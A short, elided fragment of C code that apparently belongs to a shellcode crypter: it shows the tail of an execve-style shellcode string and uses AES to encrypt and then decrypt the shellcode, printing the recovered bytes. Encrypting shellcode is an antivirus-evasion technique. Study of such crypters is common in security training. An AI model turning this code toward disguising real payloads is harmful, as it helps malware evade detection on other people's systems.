...
"\x89\xe2\xb0\x0b\xcd\x80";
    ...
    /* Encrypt the shellcode and print the ciphertext for verification */
    ...
    /* Decrypt the ciphertext and print the resulting shellcode for verification */
  
    AES_set_decrypt_key(Key, 128, &aesKey_);
    AES_decrypt(ciphertext, rshellcode, &aesKey_); 

    printf("\n");
    printf("[*] Decrypting Shellcode... \n");
    printf("[*] Recovered Original Shellcode: \n");

    for (int i = 0; i < strlen(rshellcode); i++) {
	    
	    printf("\\x%x", rshellcode[i]);
